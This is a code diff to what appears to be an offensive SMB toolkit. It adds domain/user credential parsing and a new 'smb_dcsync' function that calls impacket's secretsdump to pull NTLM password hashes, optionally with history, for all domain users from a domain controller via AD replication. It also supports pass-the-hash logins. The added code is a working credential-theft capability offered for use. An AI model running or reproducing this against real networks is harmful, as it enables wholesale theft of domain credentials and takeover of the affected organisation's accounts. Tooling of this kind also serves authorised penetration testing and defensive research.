@@ -261,6 +261,13 @@ def set_creds(length):
 	else:
 		usage()
 
+	CONF['smb_user'] = CONF['smb_user'].replace('\\', '/')
+
+	if '/' in CONF['smb_user']:
+		CONF['smb_domain'], CONF['smb_user'] = CONF['smb_user'].split('/')
+	else:
+		CONF['smb_domain'] = ''
+
 def ntlm_hash(str):
 	import hashlib, binascii
 	h = hashlib.new('md4', str.encode('utf-16le')).digest()
@@ -536,6 +543,44 @@ def smb_download():
 		usage()
 
 	print smbclient('get "%s" "%s"' % (sys.argv[3], sys.argv[4]))
+
+def smb_dcsync():
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ] [ -history ]
+	Dump domain users hashes using DRSUAPI method (AD Replication)
+	"""
+
+	### The following is using secretsdump.py from impacket ###
+	try:
+		import secretsdump
+	except:
+		print color('[!] Please install python-impacket to use this function.')
+		sys.exit(0)
+
+	set_creds(3)
+
+	class opts:
+		use_vss = False
+		aesKey = None
+		system = None
+		security = None
+		sam = None
+		ntds = None
+		history = True if '-history' in sys.argv else False
+		outputfile = None
+		k = False
+		just_dc = False
+		just_dc_ntlm = True
+		pwd_last_set = False
+		hashes = None
+
+	options = opts()
+
+	if len(CONF['smb_hash']):
+		opts.hashes = '00000000000000000000000000000000:%s' % CONF['smb_hash']
+
+	dumper = secretsdump.DumpSecrets(CONF['smb_ip'], username=CONF['smb_user'], domain=CONF['smb_domain'], password=CONF['smb_pass'], options=options)
+	dumper.dump()
 
 def smb_creddump():
 	"""
